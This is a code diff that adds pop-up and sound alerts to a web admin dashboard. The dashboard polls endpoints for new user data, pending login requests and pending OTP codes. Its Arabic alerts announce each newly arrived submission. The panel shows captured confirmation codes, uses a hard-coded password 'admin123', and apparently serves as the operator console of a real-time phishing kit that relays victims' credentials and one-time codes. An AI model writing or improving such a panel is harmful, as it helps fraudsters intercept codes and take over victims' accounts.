@@ -128,6 +128,30 @@
     cursor:pointer;
   }
 
+  .admin-notification{
+    position:fixed;
+    top:18px;
+    right:20px;
+    z-index:200;
+    min-width:280px;
+    max-width:calc(100vw - 40px);
+    padding:14px 18px;
+    border-radius:12px;
+    background:#1e8a4c;
+    color:#fff;
+    font-size:15px;
+    font-weight:800;
+    box-shadow:0 8px 24px rgba(0,0,0,0.2);
+    opacity:0;
+    transform:translateY(-12px);
+    pointer-events:none;
+    transition:opacity .2s ease, transform .2s ease;
+  }
+  .admin-notification.show{
+    opacity:1;
+    transform:translateY(0);
+  }
+
   .main{
     max-width:1000px;
     margin:0 auto;
@@ -444,6 +468,7 @@
     .action-btn{padding:7px 9px;font-size:11px;}
     .modal-overlay{padding:12px;}
     .modal-row{font-size:12px;padding:7px 0;}
+    .admin-notification{top:12px;right:12px;min-width:0;left:12px;max-width:none;text-align:center;}
   }
 </style>
 </head>
@@ -543,6 +568,8 @@
   </div>
 </div>
 
+<div class="admin-notification" id="adminNotification" role="status" aria-live="polite"></div>
+
 <!-- Details modal -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal-box">
@@ -573,11 +600,51 @@
 
 <script>
 const ADMIN_PASSWORD = "admin123";
+let audioContext = null;
+let usersSnapshot = null;
+let loginSnapshot = null;
+let otpSnapshot = null;
+let notificationTimer = null;
+
+function enableAdminSound(){
+  if(!audioContext){
+    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  }
+  if(audioContext.state === 'suspended') audioContext.resume();
+}
+
+function playAdminAlert(){
+  if(!audioContext) return;
+  const oscillator = audioContext.createOscillator();
+  const gain = audioContext.createGain();
+  oscillator.type = 'sine';
+  oscillator.frequency.setValueAtTime(880, audioContext.currentTime);
+  oscillator.frequency.exponentialRampToValueAtTime(660, audioContext.currentTime + 0.18);
+  gain.gain.setValueAtTime(0.0001, audioContext.currentTime);
+  gain.gain.exponentialRampToValueAtTime(0.16, audioContext.currentTime + 0.02);
+  gain.gain.exponentialRampToValueAtTime(0.0001, audioContext.currentTime + 0.22);
+  oscillator.connect(gain);
+  gain.connect(audioContext.destination);
+  oscillator.start();
+  oscillator.stop(audioContext.currentTime + 0.23);
+}
+
+function notifyAdmin(message){
+  const notification = document.getElementById('adminNotification');
+  notification.textContent = message;
+  notification.classList.add('show');
+  playAdminAlert();
+  clearTimeout(notificationTimer);
+  notificationTimer = setTimeout(function(){
+    notification.classList.remove('show');
+  }, 5000);
+}
 
 function tryLogin(){
   const input = document.getElementById('adminPass');
   const error = document.getElementById('gateError');
   if(input.value === ADMIN_PASSWORD){
+    enableAdminSound();
     document.getElementById('gate').style.display = 'none';
     document.getElementById('dashboard').style.display = 'block';
     sessionStorage.setItem('adminAuthed', '1');
@@ -636,6 +703,11 @@ function loadUsers(){
   fetch('/api/users')
     .then(function(r){ return r.json(); })
     .then(function(data){
+      const snapshot = JSON.stringify(data.users || []);
+      if(usersSnapshot !== null && usersSnapshot !== snapshot){
+        notifyAdmin('وصلت بيانات مستخدم جديدة إلى لوحة الأدمن');
+      }
+      usersSnapshot = snapshot;
       renderUsers(data.users || []);
       if(typeof data.activeVisits !== 'undefined'){
         document.getElementById('activeVisitsValue').textContent = data.activeVisits;
@@ -658,6 +730,11 @@ function checkPendingRequest(){
   fetch('/api/login-status')
     .then(function(r){ return r.json(); })
     .then(function(data){
+      const snapshot = data ? JSON.stringify({ username:data.username, ts:data.ts, status:data.status }) : 'none';
+      if(loginSnapshot !== null && loginSnapshot !== snapshot && data && data.status === 'pending'){
+        notifyAdmin('وصل طلب دخول جديد');
+      }
+      loginSnapshot = snapshot;
       if(data && data.status === 'pending'){
         loadUsers();
       }
@@ -693,6 +770,11 @@ function checkPendingOtp(){
   fetch('/api/otp-status')
     .then(function(r){ return r.json(); })
     .then(function(data){
+      const snapshot = data ? JSON.stringify({ code:data.code, ts:data.ts, status:data.status }) : 'none';
+      if(otpSnapshot !== null && otpSnapshot !== snapshot && data && data.status === 'pending'){
+        notifyAdmin('وصل رمز تأكيد جديد');
+      }
+      otpSnapshot = snapshot;
       const card = document.getElementById('pendingOtpCard');
       if(data && data.status === 'pending'){
         document.getElementById('reqOtpCode').textContent = data.code;
